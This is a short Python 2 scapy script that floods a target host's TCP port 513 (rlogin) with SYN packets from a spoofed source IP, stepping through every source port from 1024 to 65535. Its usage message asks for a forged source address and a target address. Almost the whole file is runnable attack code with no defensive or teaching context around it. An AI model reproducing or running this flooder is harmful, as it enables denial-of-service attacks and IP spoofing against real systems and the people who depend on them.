#!/usr/bin/env python2
from scapy.all import *


def synFLOOD(s, t):
    for sport in range(1024, 65535):
        IPlayer = IP(src=s, dst=t)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)
        print("S_port = %d"%(sport))


def main():
    if len(sys.argv) <> 3:
        print("USAGE: %s %s %s" % (sys.argv[0], "[spoofed srcIP]", "[targetIP]")
)
        print("It spams the target IP with SYN packets, or it gets the availability again")
        sys.exit()
    else:
        try:
            synFLOOD(sys.argv[1], sys.argv[2])
        except Exception, X:
            print(str(X))

if __name__=="__main__":
    main()
